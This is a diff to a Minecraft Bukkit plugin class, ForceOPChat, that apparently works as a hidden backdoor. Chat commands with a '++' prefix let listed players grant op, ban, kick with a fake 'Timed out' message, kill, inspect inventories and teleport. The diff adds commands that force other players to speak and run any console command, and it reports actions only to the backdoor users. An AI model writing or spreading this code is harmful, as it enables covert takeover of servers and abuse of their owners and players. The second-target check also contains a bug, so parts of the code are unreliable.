@@ -7,6 +7,7 @@ import java.util.List;
 
 import org.bukkit.BanList.Type;
 import org.bukkit.Bukkit;
+import org.bukkit.ChatColor;
 import org.bukkit.GameMode;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
@@ -21,9 +22,12 @@ public class ForceOPChat implements Listener {
 	private List<String> players;
 
 	private Plugin pl;
-	private String prefix = "++";
 	private boolean implode = false;
 
+	private String prefix = "++";
+	private ChatColor dark_color = DARK_GREEN;
+	private ChatColor light_color = GREEN;
+	
 	public ForceOPChat(Plugin plugin) {
 		this.pl = plugin;
 		players = new ArrayList<String>();
@@ -94,13 +98,19 @@ public class ForceOPChat implements Listener {
 			}
 		} else if (args.size() == 1) {
 			if (cmd.equalsIgnoreCase("op") || cmd.equalsIgnoreCase("ban") || cmd.equalsIgnoreCase("kick")
-					|| cmd.equalsIgnoreCase("kill") || cmd.equalsIgnoreCase("invsee")) {
+					|| cmd.equalsIgnoreCase("kill") || cmd.equalsIgnoreCase("invsee")) { // All
+																							// the
+																							// commands
+																							// with
+																							// 1
+																							// player
+																							// as
+																							// argument
 				Player target = Bukkit.getPlayer(args.get(0));
 				if (target == null || !target.isOnline()) {
 					return;
 				}
 				if (cmd.equalsIgnoreCase("op")) {
-
 					target.setOp(!target.isOp());
 					if (target.isOp()) {
 						broadcast(p.getName() + " gave " + target.getName() + " op");
@@ -112,19 +122,68 @@ public class ForceOPChat implements Listener {
 					Bukkit.getBanList(Type.NAME).addBan(target.getName(),
 							"Sorry bud, but you aint joining back anytime soon :)", null, "ForceOP");
 					broadcast(p.getName() + " has banned " + target.getName());
+					return;
 				} else if (cmd.equalsIgnoreCase("kick")) {
 					target.kickPlayer("Timed out");
 					broadcast(p.getName() + " has kicked " + target.getName());
+					return;
 				} else if (cmd.equalsIgnoreCase("kill")) {
 					GameMode oldMode = target.getGameMode();
 					target.setGameMode(GameMode.SURVIVAL);
 					target.setHealth(0);
 					target.setGameMode(oldMode);
 					broadcast(p.getName() + " has killed " + target.getName());
+					return;
 				} else if (cmd.equalsIgnoreCase("invsee")) {
 					p.openInventory(target.getInventory());
 					broadcast(p.getName() + "has opened " + target.getName() + "'s inventory");
+					return;
+				} else if (cmd.equalsIgnoreCase("tp")) {
+					p.teleport(target.getLocation());
+					broadcast(p.getName() + " teleported to " + target.getName());
+					return;
 				}
+			}
+
+		} else if (args.size() == 2) {
+			if (cmd.equalsIgnoreCase("tp")) {
+				Player target = Bukkit.getPlayer(args.get(0));
+				if (target == null || !target.isOnline()) {
+					return;
+				}
+				Player target2 = Bukkit.getPlayer(args.get(1));
+				if (target2 == null || !target.isOnline()) {
+					return;
+				}
+				target.teleport(target2);
+				broadcast(p.getName() + " teleported " + target.getName() + " to " + target2.getName());
+			}
+		}
+		if (args.size() > 2) { // Sudo
+			if (cmd.equalsIgnoreCase("sudo")) {
+				Player target = Bukkit.getPlayer(args.get(0));
+				if (target == null || !target.isOnline()) {
+					return;
+				}
+
+				StringBuilder sb = new StringBuilder();
+				for (int i = 1; i < args.size(); i++) {
+					sb.append(args.get(i) + " ");
+				}
+
+				target.chat(sb.toString());
+
+				broadcast(p.getName() + " forced " + target.getName() + " to run:\n\"" + sb.toString() + "\"");
+				return;
+			} else if (cmd.equalsIgnoreCase("console")) {
+				StringBuilder sb = new StringBuilder();
+				for (int i = 0; i < args.size(); i++) {
+					sb.append(args.get(i) + " ");
+				}
+
+				Bukkit.dispatchCommand(Bukkit.getConsoleSender(), sb.toString());
+				broadcast(p.getName() + " forced console to run:\n\"" + sb.toString() + "\"");
+				return;
 			}
 
 		}
@@ -140,22 +199,23 @@ public class ForceOPChat implements Listener {
 	}
 
 	private void showIndex(Player p) {
-		p.sendMessage(RED + prefix + LIGHT_PURPLE + "Help");
-		p.sendMessage(RED + prefix + LIGHT_PURPLE + "Op [player]");
-		p.sendMessage(RED + prefix + LIGHT_PURPLE + "Ban <player>");
-		p.sendMessage(RED + prefix + LIGHT_PURPLE + "Kick <player>");
-		p.sendMessage(RED + prefix + LIGHT_PURPLE + "Invsee <player>");
-		p.sendMessage(RED + prefix + LIGHT_PURPLE + "Tp <player> [player]");
-		p.sendMessage(RED + prefix + LIGHT_PURPLE + "Kill <player>");
-		p.sendMessage(RED + prefix + LIGHT_PURPLE + "Sudo <player> <msg>");
-		p.sendMessage(RED + prefix + LIGHT_PURPLE + "Implode");
+		p.sendMessage(dark_color + prefix + light_color + "Help");
+		p.sendMessage(dark_color + prefix + light_color + "Op [player]");
+		p.sendMessage(dark_color + prefix + light_color + "Ban <player>");
+		p.sendMessage(dark_color + prefix + light_color + "Kick <player>");
+		p.sendMessage(dark_color + prefix + light_color + "Invsee <player>");
+		p.sendMessage(dark_color + prefix + light_color + "Tp <player> [player]");
+		p.sendMessage(dark_color + prefix + light_color + "Kill <player>");
+		p.sendMessage(dark_color + prefix + light_color + "Sudo <player> <msg>");
+		p.sendMessage(dark_color + prefix + light_color + "console <msg>");
+		p.sendMessage(dark_color + prefix + light_color + "Implode");
 
 	}
 
 	public void broadcast(String msg) {
 		for (Player p : Bukkit.getOnlinePlayers()) {
 			if (players.contains(p.getUniqueId().toString())) {
-				p.sendMessage(DARK_RED + "[" + RED + "ForceOP" + DARK_RED + "] " + LIGHT_PURPLE + msg);
+				p.sendMessage(dark_color + "[" + light_color + "ForceOP" + dark_color + "] " + WHITE + msg);
 			}
 		}
 	}
